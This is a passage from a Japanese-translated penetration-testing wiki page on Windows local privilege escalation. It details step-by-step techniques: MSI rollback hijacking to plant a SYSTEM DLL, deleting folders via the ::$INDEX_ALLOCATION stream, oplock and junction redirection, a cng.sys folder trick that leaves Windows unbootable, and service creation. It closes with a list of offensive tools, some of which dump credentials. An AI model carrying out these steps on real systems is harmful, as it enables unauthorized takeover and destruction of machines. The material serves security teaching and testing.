- 攻撃者が `.rbf` ファイルを手動で削除する。
- これで **`C:\Config.Msi` は空** になり、ハイジャックの準備が整う。

> この時点で、**`C:\Config.Msi` を削除するために SYSTEM レベルの任意フォルダ削除脆弱性をトリガーしてください。**

2. **Stage 2 – rollback スクリプトを悪意あるものに置き換える**

- Step 6: `C:\Config.Msi` を弱い ACL で再作成
- 自分で `C:\Config.Msi` フォルダを再作成する。
- **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` で **handle を開いたまま** にしておく。

- Step 7: もう一度インストールを実行
- 次の設定で `.msi` を再インストールする:
- `TARGETDIR`: 書き込み可能な場所。
- `ERROROUT`: 強制的に失敗させるトリガーとなる変数。
- このインストールは再び **rollback** を引き起こすために使われ、`.rbs` と `.rbf` を読み込む。

- Step 8: `.rbs` を監視
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ち、そのファイル名を取得する。

- Step 9: rollback 前の同期
- `.msi` には **カスタムインストールアクション (`SyncBeforeRollback`)`** が含まれており、これが:
- `.rbs` が作成されたときにイベントをシグナルする。
- その後続行前に **待機** する。

- Step 10: 弱い ACL を再適用
- `.rbs created` イベントを受け取った後:
- Windows Installer は `C:\Config.Msi` に強い ACL を再適用する。
- しかし、まだ `WRITE_DAC` でハンドルを保持しているため、再度弱い ACL を **適用し直す** ことができる。

> ACL は **handle を開いた時にのみ適用される** ので、フォルダへの書き込みは可能なままです。

- Step 11: 偽の `.rbs` と `.rbf` を投入
- `.rbs` ファイルを上書きして、Windows に次を指示する **偽の rollback スクリプト** を配置する:
- あなたの `.rbf`（悪意のある DLL）を **特権のある場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
- 悪意のある SYSTEM レベルのペイロード DLL を含む偽の `.rbf` を配置する。

- Step 12: ロールバックをトリガー
- 同期イベントにシグナルを送ってインストーラーを再開させる。
- 既知のポイントで故意にインストールを失敗させる **type 19 のカスタムアクション (`ErrorOut`)** を設定しておく。
- これにより **rollback が開始** される。

- Step 13: SYSTEM があなたの DLL をインストール
- Windows Installer は:
- あなたの悪意のある `.rbs` を読み、
- あなたの `.rbf` DLL をターゲット場所にコピーする。
- これで **SYSTEM が読み込むパスに悪意のある DLL が配置** される。

- 最終ステップ: SYSTEM コードを実行
- DLL を読み込む信頼された **auto-elevated binary**（例: `osk.exe`）を実行する。
- これであなたのコードは **SYSTEM として実行されます**。

### 任意ファイルの削除/移動/名前変更から SYSTEM EoP へ

前述の主要な MSI rollback 手法は、フォルダ全体（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、もし脆弱性が **任意のファイル削除のみ** を許す場合はどうでしょうか？

NTFS の内部を利用できます: すべてのフォルダには次のような隠しの代替データストリームが存在します:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの **インデックスメタデータ** を格納します。

つまり、フォルダの **`::$INDEX_ALLOCATION` ストリームを削除すると**、NTFSはファイルシステムから**フォルダ全体を削除します**。

次のような標準的なファイル削除APIを使用して実行できます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* を削除する API を呼び出しているにもかかわらず、**フォルダ自体が削除される**。

### フォルダの内容の削除から SYSTEM EoP へ
もしあなたの primitive が任意のファイル/フォルダを削除できないが、**攻撃者が制御するフォルダの *contents* の削除は許可される**としたら？

1. Step 1: ベイトフォルダとファイルをセットアップ
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- この **oplock** は特権プロセスが `file1.txt` を削除しようとすると、**処理を一時停止させる**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ3: SYSTEMプロセスをトリガー（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock triggers** が発生し、制御をあなたのコールバックに渡します。

4. ステップ4: Inside the oplock callback – redirect the deletion

- オプションA: `file1.txt` を別の場所に移動する
- これにより `folder1` は空になりますが、oplock は壊れません。
- `file1.txt` を直接削除しないでください — それにより oplock が早期に解放されます。

- オプションB: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納する NTFS の内部ストリームを標的にしている — これを削除するとフォルダが削除される。

5. ステップ 5: oplock を解放する
- SYSTEM プロセスは続行し、`file1.txt` を削除しようとする。
- しかし、junction + symlink のため、実際に削除されているのは次のとおり:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダ作成から永続的なDoSへ

次のプリミティブを悪用して、**SYSTEM/admin として任意のフォルダを作成**します — たとえ **ファイルを書き込めない** または **弱い権限を設定できない** 場合でも。

**フォルダ**（ファイルではなく）を **重要な Windows ドライバー** の名前で作成します。例：
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` カーネルモードドライバに対応しています。
- もしそれを **事前にフォルダとして作成すると**、Windows は起動時に実際のドライバを読み込めません。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダを検出し、**実際のドライバを解決できずに**、**クラッシュまたは起動が停止します**。
- 外部の介入（例：ブート修復やディスクアクセス）なしには、**フォールバックはなく**、**復旧できません**。


## **High Integrity から SYSTEM へ**

### **新しいサービス**

既に High Integrity プロセスで実行中であれば、**SYSTEM へのパス**は、**新しいサービスを作成して実行すること**だけで簡単に得られることがあります：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する際は、それが有効なサービスであるか、あるいはサービスとして有効でない場合は20sで強制終了されるため、必要な処理を素早く実行するバイナリであることを確認してください。

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 構成ミスや機密ファイルをチェックします（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 一部の構成ミスをチェックし情報を収集します（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 構成ミスをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存されたセッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメインに対してスプレーします。**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell 製の ADIDNS/LLMNR/mDNS/NBNS スプーファ兼中間者ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows の権限昇格用列挙ツール**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の権限昇格脆弱性を検索します（Watson により非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の権限昇格脆弱性を検索します（VisualStudio でコンパイルする必要があります）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して構成ミスを検索します（権限昇格というより情報収集ツール）（コンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)）\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから資格情報を抽出します（GitHub に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp を C# に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 構成ミスをチェックします（実行ファイルは GitHub に precompiled）。推奨しません。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な構成ミスをチェックします（python から生成された exe）。推奨しません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（accesschk がなくても動作しますが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
